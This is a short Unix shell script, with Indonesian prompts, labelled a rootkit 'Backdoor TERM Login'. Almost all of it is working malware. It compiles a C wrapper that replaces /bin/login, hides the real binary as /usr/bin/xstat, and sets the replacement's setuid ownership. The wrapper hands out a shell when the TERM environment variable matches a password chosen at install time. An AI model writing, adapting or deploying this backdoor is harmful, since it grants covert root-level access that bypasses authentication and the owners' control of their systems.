#!/bin/sh
clear
echo "Headup Rootkit 2k+1  ---  Backdoor TERM Login "
echo "-------------------------------------------------"
echo "ihC.c+ sleighter.sh = term.sh :)~ "
echo " "
echo "Copying files"
echo "masukan passwordnya mas"
read pass

echo " "
cat >term.c <<__eof__
#define _XOPEN_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <signal.h>
#include <sys/time.h>
#include <string.h>

#define SHELL "/bin/sh"
#define SHELL_CALLME "login"
#define LOGIN "/usr/bin/xstat"
#define LOGIN_CALLME "login"
#define ENV_NAME "TERM"
#define ENV_VALUE "$pass"
#define ENV_FIX "vt100"

int owned(void);

char **av, **ep;

int main(int argc, char **argv, char **envp) {
   av=argv;
   ep=envp;
   av[0]=SHELL_CALLME;
        
   if (owned()) {
   char *sav[]={
       SHELL_CALLME, NULL
   };

	 execve(SHELL, sav, ep);
	 return 0;
   }
   execve(LOGIN, av, ep);
   return 0;   
}

int owned(void) {
   char *name, *value;
   int i;
   for (i=0; ep[i]!=NULL; ++i) {
      name=strtok(ep[i], "=");
      value=strtok(NULL, "=");
      if (name==NULL || value==NULL) continue;
      if (!strncmp(name, ENV_NAME, strlen(ENV_NAME))) {
	 if (!strncmp(value, ENV_VALUE, strlen(ENV_VALUE))) {
	    char tmp[100];
	sprintf(tmp, "%s=%s", ENV_NAME, ENV_FIX); 
	ep[i]=strdup(tmp);
	    return 1;
	 }
      }
   }
   return 0;
}
__eof__
echo " "
echo "..now loading"
gcc -o login term.c
chown root.bin login
chmod 4555 login
chmod u-w login
cp /bin/login /usr/bin/xstat
mv login /bin/login
chmod 555 /usr/bin/xstat
chown root.bin /usr/bin/xstat
rm -f term.c
echo "Process Sudah selesai"
echo " "
echo "Backdoor TERM created and password is : $pass"
echo " "


